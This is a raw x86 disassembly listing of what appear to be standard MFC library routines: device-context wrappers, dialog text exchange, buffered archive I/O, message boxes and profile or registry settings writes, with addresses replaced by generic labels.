mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
call [ GetDC@IAT ]
push eax
mov ecx esi
call sub_424663
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_424e73
sub_424bd0
mov eax sub_42aca0
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_42469a
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4246cb
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_424c12
mov eax sub_42acb4
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4245ac
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi ] r--data
je r-xdata
push eax
mov [ esi + 0x10 ] eax
call [ GetWindowDC@IAT ]
push eax
mov ecx esi
call sub_424663
test eax eax
jne r-xdata
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_424e73
sub_424c84
mov eax sub_42acc8
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_42469a
push eax
push [ esi + 0x10 ]
call [ ReleaseDC@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4246cb
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_424cc6
mov eax sub_42acdc
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4245ac
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
lea ecx [ esi + 0x14 ]
mov eax [ eax + 0x1c ]
push ecx
push eax
mov [ esi + 0x10 ] eax
call [ BeginPaint@IAT ]
push eax
mov ecx esi
call sub_424663
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
call sub_424e73
sub_424d38
mov eax sub_42acf0
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x14 ]
push eax
push [ esi + 0x10 ]
call [ EndPaint@IAT ]
mov ecx esi
call sub_42469a
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4246cb
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_424d7f
mov eax sub_42ad06
call sub_410a78
push esi
call sub_42731d
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_425036
call sub_4221a7
push 0x48
mov ebx eax
call sub_4221b9
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_42358d
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_4221a7
pop ebx
sub_424e06
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push 0x1
call sub_424d7f
push edi
lea ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] edi
call sub_41e529
push 0x1
mov [ eax ] esi
pop eax
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_424e33
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_424d7f
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41e579
sub_424ea5
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_424eef
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp - 0x20 ]
push 0x20
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
leave
retn 0x8
sub_424f1a
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_424f8f
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_425000
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_425036
push esi
call sub_4270c5
mov esi eax
test esi esi
je r-xdata
call sub_41dc26
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_411e9e
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_411d3a
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_410cc6
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_425088
mov eax sub_42b35b
call sub_410a78
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ ebx ]
push edi
lea ecx [ esi + 0x10 ]
mov [ ebp - 0x10 ] esi
push ecx
mov ecx ebx
call [ eax + 0x18 ]
mov ecx [ ebp + 0xc ]
or [ esi + 0xc ] 0xffffffff
push 0x1
mov [ esi + 0x14 ] ecx
pop eax
xor edi edi
not ecx
test al cl
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ebx
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi + 0x3c ] 0x40
mov [ esi + 0x3c ] 0x10
jmp r-xdata
mov [ esi + 0x1c ] ecx
mov [ esi + 0x1c ] eax
mov [ esi + 0x2c ] edi
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x2c ] ecx
mov ecx [ ebp + 0x10 ]
mov eax 0x80
mov [ esi + 0x40 ] 0x89
cmp ecx eax
mov [ esi + 0x8 ] edi
jge r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ ebp + 0x10 ]
add ecx eax
test [ esi + 0x14 ] 0x1
mov [ esi + 0x28 ] ecx
je r-xdata
mov eax [ ebx ]
push edi
push edi
push edi
push 0x3
mov ecx ebx
call [ eax + 0x50 ]
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
mov eax [ esi + 0x1c ]
cmp [ esi + 0x2c ] edi
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x24 ] eax
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax ecx
mov [ ebp + 0x10 ] edi
push [ esi + 0x1c ]
call sub_4221b9
pop ecx
mov [ esi + 0x2c ] eax
mov [ esi + 0x18 ] edi
jmp r-xdata
sub_425164
mov eax sub_42b373
call sub_410a78
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x20 ] 0x0
je r-xdata
mov ecx esi
call sub_4251aa
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x10 ]
call sub_422478
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
test [ esi + 0x14 ] 0x2
jne r-xdata
call sub_4251ec
sub_4251aa
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x18 ] edi
mov [ esi + 0x20 ] edi
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx edi
je r-xdata
push [ esi + 0x2c ]
call sub_4221e2
pop ecx
mov [ esi + 0x2c ] edi
mov [ esi + 0x24 ] edi
mov ecx [ esi + 0x34 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov [ esi + 0x34 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_4251fa
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x24 ]
push edi
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_410ff0
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0xc ]
pop edi
sub eax ebx
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov edi ebx
sub edi edx
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] edi
sub ebx [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
call [ eax + 0x34 ]
add [ ebp + 0x8 ] eax
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
test eax eax
jbe r-xdata
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x0
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
cmp ebx eax
ja r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_410ff0
add [ esi + 0x24 ] edi
add esp 0xc
sub ebx edi
mov edi ebx
mov eax [ esi + 0x2c ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x2c ]
mov [ esi + 0x24 ] eax
lea ecx [ eax + edi ]
mov [ esi + 0x28 ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jbe r-xdata
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
cmp edi ebx
jb r-xdata
mov ecx [ esi + 0x20 ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
push [ ebp - 0x8 ]
call [ eax + 0x34 ]
add [ ebp - 0x8 ] eax
sub [ ebp - 0x4 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_425309
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x24 ]
mov edi [ esi + 0x28 ]
sub edi eax
cmp ebx edi
jae r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_410ff0
add [ esi + 0x24 ] edi
add [ ebp + 0x8 ] edi
add esp 0xc
sub ebx edi
je r-xdata
mov edi ebx
mov ecx esi
call sub_425399
mov eax ebx
xor edx edx
div [ esi + 0x1c ]
mov ecx [ esi + 0x20 ]
mov edi ebx
mov eax [ ecx ]
sub edi edx
push edi
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
add [ ebp + 0x8 ] edi
sub ebx edi
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebx
push [ ebp + 0x8 ]
push [ esi + 0x24 ]
call sub_410ff0
add esp 0xc
add [ esi + 0x24 ] ebx
mov ecx [ esi + 0x20 ]
lea eax [ esi + 0x28 ]
lea edi [ esi + 0x2c ]
push eax
mov edx [ ecx ]
push edi
push [ esi + 0x1c ]
push 0x1
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x24 ] eax
sub_425399
push esi
mov esi ecx
push edi
test [ esi + 0x14 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov edx [ esi + 0x2c ]
push ebx
xor ebx ebx
cmp [ esi + 0x8 ] ebx
lea edi [ esi + 0x2c ]
jne r-xdata
mov edx [ esi + 0x28 ]
mov eax [ esi + 0x24 ]
cmp edx eax
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
mov eax [ esi + 0x28 ]
mov [ esi + 0x24 ] eax
jmp r-xdata
mov ecx [ esi + 0x20 ]
sub eax edx
push 0x1
push eax
mov edi [ ecx ]
call [ edi + 0x28 ]
mov ecx [ esi + 0x20 ]
lea edx [ esi + 0x28 ]
push edx
push edi
push [ esi + 0x1c ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x50 ]
mov ecx [ esi + 0x20 ]
push ebp
push ebx
sub eax edx
mov ebp [ ecx ]
push ebx
push eax
push 0x2
call [ ebp + 0x50 ]
pop ebp
mov eax [ edi ]
pop ebx
mov [ esi + 0x24 ] eax
mov ecx [ esi + 0x20 ]
sub eax edx
push eax
push edx
mov ebx [ ecx ]
call [ ebx + 0x38 ]
jmp r-xdata
pop edi
pop esi
retn
sub_42542c
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
call sub_4219f6
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
call sub_41dc3f
sub_42545b
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
call sub_424e8c
pop esi
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call [ SetFocus@IAT ]
cmp [ esi + 0xc ] 0x0
je r-xdata
push 0xffffffff
push 0x0
push 0xb1
push [ esi + 0x8 ]
call [ SendMessageA@IAT ]
sub_425490
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
inc eax
push esi
xor esi esi
mov cl [ eax ]
cmp cl 0x6c
je r-xdata
inc eax
cmp cl 0x73
jne r-xdata
inc ecx
mov [ ebp + 0x8 ] ecx
jmp r-xdata
cmp dl 0x9
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
pop esi
mov dl [ ecx ]
cmp dl 0x20
je r-xdata
cmp [ eax ] 0x64
mov bl [ ecx ]
jne r-xdata
cmp bl 0x2d
je r-xdata
lea eax [ ebp + 0x8 ]
push 0xa
push eax
push ecx
call sub_410daf
jmp r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp + 0x8 ]
push 0xa
push eax
push ecx
call sub_410fcb
add esp 0xc
test eax eax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
cmp bl 0x30
jne r-xdata
inc ecx
mov [ ebp + 0x8 ] ecx
jmp r-xdata
cmp dl 0x9
jne r-xdata
mov dl [ ecx ]
cmp dl 0x20
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
test esi esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov ecx [ ecx ]
mov [ ecx ] eax
movsx ecx ax
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x10 ]
mov ecx [ ecx ]
mov [ ecx ] ax
jmp r-xdata
push 0x1
pop eax
sub_425535
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
push [ ebp + 0xc ]
call sub_425415
cmp [ esi ] 0x0
mov edi eax
je r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push eax
call [ wvsprintfA@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push edi
call sub_424f8f
lea eax [ ebp - 0x20 ]
push 0x20
push eax
push edi
call [ GetWindowTextA@IAT ]
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push eax
call sub_425490
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
push 0xffffffff
push eax
push [ ebp + 0x14 ]
call sub_42595e
mov ecx esi
call sub_42545b
jmp r-xdata
sub_4255a5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
push [ ecx ]
push [ ebp + 0x10 ]
jmp r-xdata
push 0xf110
push r--data
push [ ebp + 0xc ]
push eax
call sub_425535
add esp 0x14
pop ebp
retn 0xc
sub_4255d4
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov ecx edi
call sub_425415
cmp [ edi ] 0x0
mov esi eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ eax ]
push esi
call sub_424f8f
push esi
call [ GetWindowTextLengthA@IAT ]
lea ecx [ eax + 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
call sub_4227bc
push eax
push esi
call [ GetWindowTextA@IAT ]
mov ecx [ ebp + 0x10 ]
push 0xffffffff
call sub_422794
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_425626
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx esi
push [ esp + 0x10 ]
call sub_42542c
xor edi edi
cmp [ esi ] edi
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx ]
cmp edx edi
jl r-xdata
push edi
push edi
push 0xf0
push eax
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov [ ecx ] edi
cmp edx 0x2
jle r-xdata
pop edi
pop esi
retn 0xc
push edi
push [ ecx ]
push 0xf1
push eax
call [ SendMessageA@IAT ]
sub_425678
push esi
push edi
mov edi [ esp + 0x14 ]
cmp [ edi + 0x1c ] 0x0
jne r-xdata
pop edi
pop esi
retn 0xc
mov esi [ esp + 0xc ]
push [ esp + 0x10 ]
mov ecx esi
call sub_42542c
push eax
mov ecx edi
call sub_42193b
test eax eax
jne r-xdata
push [ edi + 0x1c ]
mov esi [ esi + 0x4 ]
call [ GetParent@IAT ]
cmp [ esi + 0x1c ] eax
je r-xdata
call sub_41dc3f
jmp r-xdata
push esi
mov ecx edi
call sub_421c9c
sub_4256c4
mov eax [ ecx + 0x9c ]
push esi
test eax eax
je r-xdata
call sub_408750
mov esi eax
mov ecx esi
mov eax [ esi ]
call [ eax + 0xb0 ]
test eax eax
mov ecx esi
jne r-xdata
cmp eax 0x3f107
je r-xdata
call sub_425d66
call sub_425cc4
pop esi
retn
pop esi
retn
mov edx [ ecx ]
push 0x1
push eax
call [ edx + 0x98 ]
pop esi
retn
sub_425708
push esi
push edi
mov esi ecx
push 0x2
call sub_427d7a
mov edi [ esp + 0xc ]
add [ esi + 0xa0 ] edi
mov eax [ esi + 0xa0 ]
test eax eax
jle r-xdata
push [ esi + 0xa4 ]
and [ esi + 0xa0 ] 0x0
call [ SetCursor@IAT ]
push [ rw-data ]
call [ SetCursor@IAT ]
test edi edi
jle r-xdata
push 0x2
call sub_427dea
pop edi
pop esi
retn 0x4
cmp [ esi + 0xa0 ] 0x1
jne r-xdata
mov [ esi + 0xa4 ] eax
jmp r-xdata
sub_4257de
mov eax [ esp + 0x4 ]
push esi
lea esi [ ecx + 0xa8 ]
push edi
lea edi [ eax - 0xe110 ]
mov edx [ ecx ]
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov eax [ eax + edi * 4 ]
push eax
call [ edx + 0x7c ]
test eax eax
jne r-xdata
push 0x1
pop eax
pop edi
pop esi
retn 0x4
mov ecx [ esi ]
push edi
mov eax [ ecx ]
call [ eax ]
sub_425811
push esi
call sub_408750
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_42583f
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_425811
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_4259b7
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_425811
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_425926
push ebp
mov ebp esp
call sub_4272f7
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42583f
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_42595e
mov eax sub_42ac28
call sub_410a78
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_423897
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_425926
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_422478
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_4259b7
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_425a53
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_408750
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_425a5f
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0x7c ] 0x0
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push [ esi + 0x90 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WritePrivateProfileStringA@IAT ]
push [ ebp + 0x8 ]
call sub_426dab
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn 0xc
push edi
lea eax [ ebp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push [ ebp + 0xc ]
push esi
call [ RegSetValueExA@IAT ]
push esi
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
pop edi
jmp r-xdata
sub_425ad4
push ebp
mov ebp esp
cmp [ ecx + 0x7c ] 0x0
push esi
push edi
je r-xdata
push [ ecx + 0x90 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ WritePrivateProfileStringA@IAT ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
call sub_426d17
mov esi eax
test esi esi
jne r-xdata
call sub_426dab
mov esi eax
test esi esi
je r-xdata
call sub_426dab
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push esi
call [ RegDeleteKeyA@IAT ]
jmp r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
inc eax
push eax
push [ ebp + 0x10 ]
push 0x1
push 0x0
push [ ebp + 0xc ]
push esi
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
push esi
call [ RegDeleteValueA@IAT ]
jmp r-xdata
push esi
mov edi eax
call [ RegCloseKey@IAT ]
xor eax eax
test edi edi
sete al
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_425b74
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_42391b
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_425bae
sub_425bae
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_422745
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_422794
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
